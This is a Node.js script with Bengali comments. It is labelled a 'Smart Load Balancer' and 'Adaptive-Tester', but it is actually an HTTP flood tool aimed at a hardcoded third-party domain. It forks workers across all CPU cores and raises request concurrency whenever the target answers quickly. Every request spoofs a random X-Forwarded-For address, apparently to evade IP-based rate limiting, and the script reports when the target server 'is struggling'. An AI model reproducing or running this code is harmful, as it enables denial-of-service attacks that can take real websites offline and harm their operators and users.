const https = require('https');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

const targetUrl = 'https://asopori.com/';
const PRINT_INTERVAL = 5000; // ৫ সেকেন্ড পর পর আপডেট দেখাবে

if (cluster.isMaster) {
    let totalSuccess = 0;
    let totalErrors = 0;
    console.log(`🚀 Smart Load Balancer Started...`);
    console.log(`💻 Server Specs: 0.1 CPU | 512MB RAM`);

    for (let i = 0; i < numCPUs; i++) {
        const worker = cluster.fork();
        worker.on('message', (msg) => {
            if (msg.type === 'success') totalSuccess++;
            if (msg.type === 'error') totalErrors++;
        });
    }

    setInterval(() => {
        const rps = (totalSuccess / 5).toFixed(2);
        console.log(`[${new Date().toLocaleTimeString()}] 📊 Stats:`);
        console.log(`   ✅ Success: ${totalSuccess} | ❌ Failed: ${totalErrors} | ⚡ Avg: ${rps} req/sec`);

        if (totalErrors > totalSuccess) {
            console.log(`   ⚠️  Warning: Server is struggling! Throttling auto-detected.`);
        }
        totalSuccess = 0;
        totalErrors = 0;
    }, PRINT_INTERVAL);

} else {
    const agent = new https.Agent({
        keepAlive: true,
        maxSockets: 100, // ৫১২ এমবি র‍্যামের জন্য এটি লিমিটেড রাখা ভালো
    });

    let currentConcurrency = 10; // শুরু হবে ১০টি রিকোয়েস্ট দিয়ে
    const maxConcurrency = 200;  // আপনার সার্ভারের জন্য এর বেশি যাওয়া ঝুঁকিপূর্ণ

    function getRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    function sendRequest() {
        const start = Date.now();
        const options = {
            method: 'GET',
            agent: agent,
            headers: {
                'X-Forwarded-For': getRandomIP(),
                'User-Agent': 'Adaptive-Tester/1.0',
            }
        };

        const req = https.get(targetUrl, options, (res) => {
            const duration = Date.now() - start;
            res.resume(); // Memory free করার জন্য

            res.on('end', () => {
                process.send({ type: 'success' });

                // --- AUTO DETECT LOGIC ---
                // যদি সার্ভার ২০০ মিলিসেকেন্ডের চেয়ে দ্রুত রেসপন্স দেয়, লোড বাড়াও
                if (duration < 200 && currentConcurrency < maxConcurrency) {
                    currentConcurrency++;
                    setImmediate(sendRequest);
                    setImmediate(sendRequest); // ডাবল রিকোয়েস্ট পাঠিয়ে লোড বাড়ানো
                } else {
                    // সার্ভার স্লো হলে রিকোয়েস্ট রেট কমাও
                    setTimeout(sendRequest, 50);
                }
            });
        });

        req.on('error', () => {
            process.send({ type: 'error' });
            // এরর খেলে ৫১২ এমবি র‍্যামে প্রেসার না দিয়ে একটু বিরতি দাও
            setTimeout(sendRequest, 500);
        });

        req.end();
    }

    // শুরুতে ছোট আকারে শুরু করা
    for (let i = 0; i < currentConcurrency; i++) {
        sendRequest();
    }
}
